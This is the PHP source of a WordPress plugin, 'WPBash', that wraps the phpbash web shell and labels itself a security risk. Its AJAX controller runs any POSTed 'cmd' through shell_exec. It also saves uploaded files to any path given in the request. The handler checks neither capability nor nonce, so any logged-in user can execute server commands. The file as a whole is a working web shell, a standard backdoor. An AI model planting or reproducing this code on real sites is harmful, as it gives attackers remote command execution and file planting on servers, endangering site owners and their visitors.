<?php

/**
 * Plugin Name: WPBash
 * Description: A Wordpress plugin wrapper for [phpbash](https://github.com/Arrexel/phpbash), a standalone, semi-interactive web shell. This script represent a security risk, use with caution.
 * Version: 1.0
 * Author: Juan Pablo Juliao
 * Author URI: jpjuliao.com
 */
 
Namespace Jpjuliao\WPBash;

if (!defined('ABSPATH')) {
    exit;
}

new WPBash();
 
class WPBash
{

    /**
     * Autoload
     * @return void
     */
    public function __construct()
    {
        add_action('wp_ajax_wpbash', [$this, 'controller']);
        add_action('admin_menu', [$this, 'register_page']);
        add_action('admin_enqueue_scripts', [$this, 'enqueue_scripts']);
    }

    /**
     * Page URL
     */
    public $page_url;
        
    /**
     * Register menu
     * @return void
     */
    public function register_page()
    {
        add_submenu_page(
            'tools.php',
            'WPBash',
            'WPBash',
            'manage_options',
            'wpbash',
            array($this, 'view')
        );
        $this->page_url = menu_page_url('wpbash', $echo = false);
    }

    /**
     * Controller
     * @return void
     */
    public function controller()
    {
        if (isset($_POST['cmd'])) {
            $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
            foreach ($output as $line) {
                echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
            }
            die();
        } elseif (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
            $filename = $_FILES["file"]["name"];
            $path = $_POST['path'];
            if ($path != "/") {
                $path .= "/";
            }
            if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
                echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
            } else {
                echo "Error uploading " . htmlentities($filename);
            }
            die();
        }
    }

    /**
     * View
     * @return void
     */
    public function view()
    {
        ?>
        <style>
            .inputtext {
                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                font-size: 14px;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                line-height: 20px;
                overflow: hidden;
            }
        
            .console {
                width: 100%;
                height: 100%;
                margin: auto;
                position: absolute;
                color: #fff;
            }
            
            .output {
                width: auto;
                height: auto;
                position: absolute;
                overflow-y: scroll;
                top: 0;
                bottom: 30px;
                left: 5px;
                right: 0;
                line-height: 20px;
            }
                                 
            .input form {
                position: relative;
                margin-bottom: 0px;
            }
                     
            .username {
                height: 30px;
                width: auto;
                padding-left: 5px;
                line-height: 30px;
                float: left;
            }

            .input {
                border-top: 1px solid #333333;
                width: 100%;
                height: 30px;
                position: absolute;
                bottom: 0;
            }

            .inputtext {
                width: auto;
                height: 30px;
                bottom: 0px;
                margin-bottom: 0px;
                background: #000;
                border: 0;
                float: left;
                padding-left: 8px;
                color: #fff;
            }
            
            .inputtext:focus {
                outline: none;
            }

            ::-webkit-scrollbar {
                width: 12px;
            }

            ::-webkit-scrollbar-track {
                background: #101010;
            }

            ::-webkit-scrollbar-thumb {
                background: #303030; 
            }
        </style>
        <div class="console">
            <div class="output" id="wpbash_output"></div>
            <div class="input" id="wpbash_input">
                <form id="wpbash_form" method="GET" onSubmit="sendCommand()">
                    <div class="username" id="wpbash_username"></div>
                    <input class="inputtext" id="wpbash_inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                </form>
            </div>
        </div>
        <form id="wpbash_upload" method="POST" style="display: none;">
            <input type="file" name="file" id="wpbash_filebrowser" onchange='uploadFile()' />
        </form>
     <?php
    }

    /**
     * Register scripts
     * @return void
     */
    public function enqueue_scripts() {
        wp_enqueue_script( 'wpbash-main-js', plugins_url( 'assets/main.js', __FILE__ ) );
    }
}
